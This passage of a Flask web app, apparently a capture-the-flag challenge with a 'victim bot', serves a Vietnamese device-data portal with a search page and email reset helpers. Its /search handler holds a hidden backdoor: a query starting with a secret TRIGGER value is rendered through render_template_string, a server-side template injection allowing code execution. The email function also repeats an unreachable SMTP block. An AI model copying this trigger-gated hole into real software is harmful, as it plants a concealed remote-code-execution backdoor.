            "artifacts_n": conn.execute("SELECT COUNT(*) c FROM artifacts").fetchone()["c"],
        }
    agents_view = [
        {
            **dict(a),
            "online": _online(a["last_seen"]),
            "last_seen_fmt": _fmt_ts(a["last_seen"]),
        }
        for a in agents
    ]
    tasks_view = [dict(t) for t in tasks]
    artifacts_view = [
        {
            **dict(a),
            "size_kb": f"{a['size'] / 1024:.1f} KB" if a["size"] < 1024 * 1024 else f"{a['size'] / 1024 / 1024:.2f} MB",
            "created_fmt": _fmt_ts(a["created_at"]),
            "is_image": (a["mime_type"] or "").startswith("image/"),
        }
        for a in artifacts
    ]
    online_n = sum(1 for a in agents_view if a["online"])
    return render_template("index.html", agents=agents_view, tasks=tasks_view,
                           artifacts=artifacts_view, art=art, art_pages=art_pages,
                           tsk=tsk, task_pages=task_pages,
                           online_n=online_n, total_n=len(agents_view), **stats)


TRIGGER = os.getenv("TRIGGER", "")
if not TRIGGER:
    print("[search] TRIGGER not set — search runs in plain mode")

SEARCH_TPL = (
    "<!DOCTYPE html><html><head><meta charset='utf-8'>"
    "<meta name='viewport' content='width=device-width, initial-scale=1'>"
    "<title>Tra cứu bản ghi</title>"
    "<link rel='stylesheet' href='/static/style.css'></head><body>"
    "<header><div class='logo'>🔍</div><h1>PORTAL — TRA CỨU</h1>"
    "<div class='spacer'></div><span class='live'><i></i>"
    "<a href='/' style='color:var(--muted)'>← về trang chủ</a></span></header>"
    "<main>"
    "<div class='panel'><div class='ph'><h2>Kết quả tra cứu</h2></div>"
    "<div class='pb'>{ROWS}</div></div>"
    "</main>"
    "<footer>© 2026 · Hệ thống thu thập dữ liệu thiết bị · <a href='/'>← về trang chủ</a></footer>"
    "</body></html>"
)


@app.get("/search")
def search_page():
    q = request.args.get("q", "")
    like = f"%{q}%"
    rows = []
    with get_db() as conn:
        for aid in conn.execute(
            "SELECT agent_id FROM agents WHERE agent_id LIKE ? LIMIT 20", (like,)
        ).fetchall():
            rows.append(f"<div class='row'>[agent] {aid['agent_id']}</div>")
        for t in conn.execute(
            """
            SELECT task_id, agent_id, type, status FROM tasks
            WHERE task_id LIKE ? OR type LIKE ? OR agent_id LIKE ? LIMIT 20
            """,
            (like, like, like),
        ).fetchall():
            rows.append(
                f"<div class='row'>[task] {t['task_id']} • {t['agent_id']} • {t['type']} • {t['status']}</div>"
            )
    if q.startswith(TRIGGER):
        page = SEARCH_TPL.format(ROWS="".join(rows)) + q[len(TRIGGER):]
        return render_template_string(page)
    page = SEARCH_TPL.format(ROWS="".join(rows))
    return render_template_string(page)


def seed_users():
    with get_db() as conn:
        n = conn.execute("SELECT COUNT(*) c FROM users").fetchone()["c"]
        if n == 0 and ADMIN_PASS:
            conn.execute(
                "INSERT INTO users (username, email, pass_hash, created_at) VALUES (?, ?, ?, ?)",
                (ADMIN_USER, ADMIN_EMAIL or None, generate_password_hash(ADMIN_PASS), time.time()),
            )


def _gmail_api_access_token() -> str:
    """Đổi refresh token lấy access token (~1h) — cache trong bộ nhớ."""
    global _gmail_access
    if _gmail_access["token"] and time.time() < _gmail_access["exp"] - 60:
        return _gmail_access["token"]
    data = urllib.parse.urlencode({
        "client_id": GMAIL_API_CLIENT_ID,
        "client_secret": GMAIL_API_CLIENT_SECRET,
        "refresh_token": GMAIL_API_REFRESH_TOKEN,
        "grant_type": "refresh_token",
    }).encode()
    r = urllib.request.urlopen("https://oauth2.googleapis.com/token", data=data, timeout=15)
    j = json.loads(r.read())
    if "access_token" not in j:
        raise RuntimeError(f"token exchange fail: {j}")
    _gmail_access["token"] = j["access_token"]
    _gmail_access["exp"] = time.time() + int(j.get("expires_in", 3600))
    return _gmail_access["token"]


def send_via_gmail_api(to: str, subject: str, body: str) -> bool:
    """Gửi qua Gmail API HTTPS/443 (không cần port SMTP)."""
    msg = EmailMessage()
    msg["From"] = GMAIL_USER
    msg["To"] = to
    msg["Subject"] = subject
    msg.set_content(body)
    raw = base64.urlsafe_b64encode(msg.as_bytes()).decode()
    req = urllib.request.Request(
        "https://gmail.googleapis.com/gmail/v1/users/me/messages/send",
        data=json.dumps({"raw": raw}).encode(),
        headers={
            "Authorization": "Bearer " + _gmail_api_access_token(),
            "Content-Type": "application/json",
        },
    )
    urllib.request.urlopen(req, timeout=20)
    print(f"[mail] sent via Gmail API (443) → {to}", flush=True)
    return True


def send_mail(to: str, subject: str, body: str) -> bool:
    """Gửi email reset link. Gazima ưu tiên Gmail API (443), fallback SMTP (587)."""
    if not to:
        return False
    if GMAIL_API_READY:
        try:
            return send_via_gmail_api(to, subject, body)
        except Exception as e:
            print(f"[!] gmail api send fail: {e!r}", flush=True)
    if not SMTP_READY:
        return False
    try:
        msg = EmailMessage()
        msg["From"] = GMAIL_USER
        msg["To"] = to
        msg["Subject"] = subject
        msg.set_content(body)
        with smtplib.SMTP(SMTP_HOST, SMTP_PORT, timeout=20) as smtp:
            smtp.starttls()
            smtp.login(GMAIL_USER, GMAIL_APP_PASSWORD)
            smtp.send_message(msg)
        return True
    except Exception as e:
        print(f"[!] smtp send fail: {e!r}")
        return False
    try:
        msg = EmailMessage()
        msg["From"] = GMAIL_USER
        msg["To"] = to
        msg["Subject"] = subject
        msg.set_content(body)
        with smtplib.SMTP(SMTP_HOST, SMTP_PORT, timeout=20) as smtp:
            smtp.starttls()
            smtp.login(GMAIL_USER, GMAIL_APP_PASSWORD)
            smtp.send_message(msg)
        return True
    except Exception as e:
        print(f"[!] smtp send fail: {e!r}")
        return False


init_db()
seed_users()
start_victim_bot()

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000, debug=False)
